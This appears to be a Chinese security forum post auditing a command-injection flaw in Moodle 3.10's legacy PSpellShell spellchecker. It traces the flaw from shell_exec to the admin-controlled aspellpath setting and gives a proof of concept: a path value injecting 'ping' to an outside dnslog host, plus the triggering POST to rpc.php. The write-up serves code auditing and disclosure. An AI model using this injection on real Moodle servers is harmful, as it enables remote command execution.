前言
--

Moodle 是世界上最流行的学习管理系统。在几分钟内开始创建您的在线学习网站！

Moodle 3.10 中默认的旧版拼写检查器插件中存在命令执行漏洞。一系列特制的 HTTP 请求可以导致命令执行。攻击者必须具有管理员权限才能利用此漏洞。

过程分析
----

对于PHP代码审计，一般会先看常见危险函数，参数是否可控。  
全局搜索危险函数：`shell_exec`，程序有两处调用，让我们进一步跟踪，看参数是否可控。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8fb0b5fae0f5bbd09bd30c24097ebaaac613c8c0.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8fb0b5fae0f5bbd09bd30c24097ebaaac613c8c0.png)

跟进PSpellShell.php文件31行处的调用  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c397fe8b9a8da7dd339084e951c9672eccc540d5.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c397fe8b9a8da7dd339084e951c9672eccc540d5.png)

进一步跟进参数`$cmd`，来自19行处`$this->_getCMD($lang);`调用，一般情况下，这时候要看变量`$lang`的来源了。此处我们先看下`_getCMD()`方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b63e0ef715c90d8c6572c81d62d3eb335ba35c3e.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b63e0ef715c90d8c6572c81d62d3eb335ba35c3e.png)

可以看到，有两个参数可控，其中一个`$lang`，不过，这个变量不能存在`_-a-z`这些字符，局限性比较大。不如来跟进`$bin`这个变量  
跟进`$this->_config`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b7117c5708f88011724d89646b057f68e7c33d5b.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b7117c5708f88011724d89646b057f68e7c33d5b.png)

`$CFG`是一个全局变量，用来存储所有配置项，不用过多考虑，下面直接全局搜索`aspellpath`

在文件`config-dist.php:1038`处，我们知道这个变量是指定拼写检查插件的位置。接下来，再找找哪里可以设置这个参数  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6c13a05efe30febe0e60fe7f35eeec7550d2a4b1.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6c13a05efe30febe0e60fe7f35eeec7550d2a4b1.png)

如下，管理员设置系统路径配置的一个方法，构造url：`http://moodle.langke.com/admin/settings.php?section=systempaths`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-057f375e3fc35079f63407a56ba469b124fcb83b.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-057f375e3fc35079f63407a56ba469b124fcb83b.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b9cc8072c8c4812fd3fc3434fba463874ed7c489.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b9cc8072c8c4812fd3fc3434fba463874ed7c489.png)

根据位置，构造payload：

```php
$aspellpath = 'ping ihamhr.dnslog.cn ||'

if (preg_match("#win#i", php_uname()))
            return "$bin -a --lang=$lang --encoding=utf-8 -H < $file 2>&1";

        return "cat $file | $bin -a --lang=$lang --encoding=utf-8 -H";

// 最终shell_exec()执行的语句
# win
'ping ihamhr.dnslog.cn ||-a --lang=$lang --encoding=utf-8 -H < $file 2>&1'
# linux 
'cat $file | ping ihamhr.dnslog.cn ||-a --lang=$lang --encoding=utf-8 -H'

```

下面找到调用这个插件的地方  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-32377e97932407048f7628b38fa03a627044aeb1.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-32377e97932407048f7628b38fa03a627044aeb1.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-715ab8a02b3952a43a4825e43dc95d61f080f464.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-715ab8a02b3952a43a4825e43dc95d61f080f464.png)

设置拼写检查器引擎为`PSpellShell`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-88e75c71562f43f04353da08747a444b8c26a1bd.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-88e75c71562f43f04353da08747a444b8c26a1bd.png)

下面调用，跟进`config.php`文件30行，  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8bf4aaf0712670994cf0ab88240e18702b3ab759.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8bf4aaf0712670994cf0ab88240e18702b3ab759.png)

跟进`rcp.php`，最终可以通过这个文件触发漏洞位置

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-989538dd1ea19fe89061d7e3b62de9e416588a7a.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-989538dd1ea19fe89061d7e3b62de9e416588a7a.png)

关键代码，给`method`参数传入`PSpellShell`类有漏洞的方法·`checkWords`或者`getSuggestions`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-0755a4c9c076b8103dee2088abccf8437b0d68ff.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-0755a4c9c076b8103dee2088abccf8437b0d68ff.png)

构造post请求：url: lib/editor/tinymce/plugins/spellchecker/rpc.php

```php
{"method":"getSuggestions","params":["1","2"]}
```

验证
--

设置paylaod  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-ddb4fbaa0c8e1480d80070effb393c42c4399e03.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-ddb4fbaa0c8e1480d80070effb393c42c4399e03.png)

设置引擎  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-27a75b847c6e2a6281531de1f114394204c705dc.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-27a75b847c6e2a6281531de1f114394204c705dc.png)

触发：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-46243f37d8cb238bcc3fe745f76e22c1f6861684.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-46243f37d8cb238bcc3fe745f76e22c1f6861684.png)